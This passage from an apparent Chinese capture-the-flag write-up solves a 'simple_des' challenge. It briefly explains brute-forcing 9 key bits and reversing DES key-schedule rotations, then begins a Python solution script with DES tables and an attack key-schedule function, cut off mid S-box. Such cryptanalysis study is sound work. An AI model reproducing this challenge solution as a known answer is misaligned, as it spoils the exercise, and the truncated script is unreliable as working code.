href=\"#simple-des\" class=\"headerlink\" title=\"simple_des\"></a>simple_des</h2><p>爆破9位恢复L，之后逆推下面这个操作即可恢复L，R的初始，由于LR来自key其中的56位，所以只要知道key的56个bit即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[i]):</span><br><span class=\"line\">        L.append(L.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">        R.append(R.pop(<span class=\"number\">0</span>))</span><br></pre></td></tr></table></figure>\n\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> operator <span class=\"keyword\">import</span> add</span><br><span class=\"line\"><span class=\"keyword\">from</span> typing <span class=\"keyword\">import</span> <span class=\"type\">List</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">_IP = [<span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>,</span><br><span class=\"line\">       <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>,</span><br><span class=\"line\">       <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>, <span class=\"number\">13</span>, <span class=\"number\">5</span>,</span><br><span class=\"line\">       <span class=\"number\">63</span>, <span class=\"number\">55</span>, <span class=\"number\">47</span>, <span class=\"number\">39</span>, <span class=\"number\">31</span>, <span class=\"number\">23</span>, <span class=\"number\">15</span>, <span class=\"number\">7</span>,</span><br><span class=\"line\">       <span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">       <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>, <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>,</span><br><span class=\"line\">       <span class=\"number\">60</span>, <span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">       <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">IP</span>(<span class=\"params\">plain: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [plain[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> _IP]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__pc1 = [<span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">         <span class=\"number\">0</span>, <span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>,</span><br><span class=\"line\">         <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">         <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>, <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>,</span><br><span class=\"line\">         <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>,</span><br><span class=\"line\">         <span class=\"number\">6</span>, <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>,</span><br><span class=\"line\">         <span class=\"number\">13</span>, <span class=\"number\">5</span>, <span class=\"number\">60</span>, <span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">         <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span></span><br><span class=\"line\">         ]</span><br><span class=\"line\"></span><br><span class=\"line\">__pc2 = [</span><br><span class=\"line\">    <span class=\"number\">13</span>, <span class=\"number\">16</span>, <span class=\"number\">10</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>, <span class=\"number\">27</span>, <span class=\"number\">14</span>, <span class=\"number\">5</span>, <span class=\"number\">20</span>, <span class=\"number\">9</span>,</span><br><span class=\"line\">    <span class=\"number\">22</span>, <span class=\"number\">18</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">25</span>, <span class=\"number\">7</span>,</span><br><span class=\"line\">    <span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">26</span>, <span class=\"number\">19</span>, <span class=\"number\">12</span>, <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">40</span>, <span class=\"number\">51</span>, <span class=\"number\">30</span>, <span class=\"number\">36</span>, <span class=\"number\">46</span>, <span class=\"number\">54</span>,</span><br><span class=\"line\">    <span class=\"number\">29</span>, <span class=\"number\">39</span>, <span class=\"number\">50</span>, <span class=\"number\">44</span>, <span class=\"number\">32</span>, <span class=\"number\">47</span>,</span><br><span class=\"line\">    <span class=\"number\">43</span>, <span class=\"number\">48</span>, <span class=\"number\">38</span>, <span class=\"number\">55</span>, <span class=\"number\">33</span>, <span class=\"number\">52</span>,</span><br><span class=\"line\">    <span class=\"number\">45</span>, <span class=\"number\">41</span>, <span class=\"number\">49</span>, <span class=\"number\">35</span>, <span class=\"number\">28</span>, <span class=\"number\">31</span></span><br><span class=\"line\">]</span><br><span class=\"line\">ROTATIONS = [<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">PC_1</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [key[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __pc1]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">PC_2</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [key[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __pc2]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sub_key</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]:</span><br><span class=\"line\">    key = PC_1(key)</span><br><span class=\"line\">    L, R = key[:<span class=\"number\">28</span>], key[<span class=\"number\">28</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    sub_keys = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[i]):</span><br><span class=\"line\">            L.append(L.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">            R.append(R.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        combined = L + R</span><br><span class=\"line\">        sub_key = PC_2(combined)</span><br><span class=\"line\">        sub_keys.append(sub_key)</span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;LL=&#x27;, L[:19])</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;Rr=&#x27;, R)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sub_keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sub_key_attack</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]:</span><br><span class=\"line\">    L, R = key[:<span class=\"number\">28</span>], key[<span class=\"number\">28</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    sub_keys = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[i]):</span><br><span class=\"line\">            L.append(L.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">            R.append(R.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        combined = L + R</span><br><span class=\"line\">        sub_key = PC_2(combined)</span><br><span class=\"line\">        sub_keys.append(sub_key)</span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;LL=&#x27;, L[:19])</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;Rr=&#x27;, R)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sub_keys</span><br><span class=\"line\"></span><br><span class=\"line\">__ep = [<span class=\"number\">31</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">        <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">        <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>,</span><br><span class=\"line\">        <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>,</span><br><span class=\"line\">        <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>,</span><br><span class=\"line\">        <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, <span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>,</span><br><span class=\"line\">        <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">25</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">        <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">0</span></span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">__p = [<span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">28</span>, <span class=\"number\">11</span>, <span class=\"number\">27</span>, <span class=\"number\">16</span>,</span><br><span class=\"line\">       <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">22</span>, <span class=\"number\">25</span>, <span class=\"number\">4</span>, <span class=\"number\">17</span>, <span class=\"number\">30</span>, <span class=\"number\">9</span>,</span><br><span class=\"line\">       <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">23</span>, <span class=\"number\">13</span>, <span class=\"number\">31</span>, <span class=\"number\">26</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">       <span class=\"number\">18</span>, <span class=\"number\">12</span>, <span class=\"number\">29</span>, <span class=\"number\">5</span>, <span class=\"number\">21</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">24</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">EP</span>(<span class=\"params\">data: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [data[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __ep]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">P</span>(<span class=\"params\">data: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [data[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __p]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__s_box = [</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">14</span>, <span class=\"number\">4</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">14</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>, <span class=\"number\">6</span>, <span class=\"number\">2</span>, <span class=\"number\">11</span>, <span class=\"number\">15</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>],</span><br><span class=\"line\">        [<span class=\"number\">15</span>, <span class=\"number\">12</span>, <span class=\"number\">8</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">14</span>, <span class=\"number\">10</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">13</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">15</span>, <span class=\"number\">1</span>, <span class=\"number\">8</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">13</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>],</span><br><span class=\"line\">        [<span class=\"number\">3</span>, <span class=\"number\">13</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>, <span class=\"number\">15</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">14</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">5</span>],</span><br><span class=\"line\">        [<span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>, <span class=\"number\">11</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>, <span class=\"number\">12</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">10</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>, <span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>, <span class=\"number\">11</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">14</span>, <span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">15</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">        